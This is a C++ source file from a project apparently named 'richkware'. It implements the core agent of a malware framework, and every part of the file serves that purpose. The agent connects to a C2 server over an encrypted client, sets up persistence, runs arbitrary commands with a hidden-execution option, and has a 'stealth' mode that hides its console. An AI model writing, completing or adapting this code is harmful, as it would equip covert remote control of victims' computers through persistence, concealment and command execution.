#include "richkware/core/agent.hpp"
#include "richkware/utils/logger.hpp"
#include <iostream>

namespace richkware::core {

Agent::Agent(Config config) : config_(std::move(config)) {
    // Initialize components
    crypto_manager_ = std::make_unique<crypto::CipherManager>();
    network_client_ = std::make_unique<network::NetworkClient>(
        config_.server_address, config_.server_port, config_.encryption_key, true
    );
    persistence_manager_ = std::make_unique<system::PersistenceManager>(config_.app_name);
    command_executor_ = std::make_unique<modules::CommandExecutor>();
    file_manager_ = std::make_unique<modules::FileManager>();
}

Agent::~Agent() {
    stop();
}

Result<void> Agent::initialize() {
    LOG_INFO("Agent initialized: {}", config_.app_name);
    
    // Initialize crypto
    if (auto result = crypto_manager_->set_password(config_.encryption_key); !result) {
        return result;
    }
    
    // Initialize network
    if (auto result = network_client_->initialize(); !result) {
        return result;
    }
    
    // Initialize persistence
    if (auto result = persistence_manager_->initialize(); !result) {
        return result;
    }
    
    return Result<void>{};
}

Result<void> Agent::start() {
    running_ = true;
    LOG_INFO("Agent started");

    // Connect to C2 server
    if (auto result = network_client_->connect(); !result) {
        LOG_WARNING("Failed to connect to C2 server: {}", result.error().what());
    }

    return Result<void>{};
}

void Agent::stop() {
    running_ = false;

    if (network_client_) {
        network_client_->disconnect();
    }

    LOG_INFO("Agent stopped");
}

bool Agent::is_running() const noexcept {
    return running_;
}

Result<std::string> Agent::execute_command(const std::string& command) {
    if (!command_executor_) {
        return RichkwareError{ErrorCode::SystemError, "Command executor not initialized"};
    }
    
    modules::ExecutionOptions options;
    options.run_hidden = stealth_enabled_;
    options.timeout = std::chrono::seconds(30);
    
    auto result = command_executor_->execute(command, options);
    if (!result) {
        return result.error();
    }
    
    return result.value().stdout_output;
}

Result<void> Agent::enable_stealth() {
    stealth_enabled_ = true;
    
    if (persistence_manager_) {
        auto stealth_result = persistence_manager_->stealth().hide_console();
        if (!stealth_result) {
            std::cout << "Warning: Failed to hide console" << std::endl;
        }
    }
    
    return Result<void>{};
}

Result<void> Agent::disable_stealth() {
    stealth_enabled_ = false;
    
    if (persistence_manager_) {
        auto stealth_result = persistence_manager_->stealth().show_console();
        if (!stealth_result) {
            std::cout << "Warning: Failed to show console" << std::endl;
        }
    }
    
    return Result<void>{};
}

} // namespace richkware::core